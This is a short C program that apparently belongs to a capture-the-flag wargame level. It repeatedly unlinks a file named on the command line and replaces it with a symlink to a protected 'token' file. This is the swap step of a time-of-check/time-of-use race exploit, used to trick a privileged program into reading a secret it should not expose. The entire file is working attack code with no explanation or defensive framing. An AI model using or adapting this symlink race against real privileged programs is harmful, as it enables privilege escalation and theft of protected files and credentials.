#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char * argv[])
{
    unlink(argv[1]);
    symlink("/home/user/level10/token",argv[1]);
}

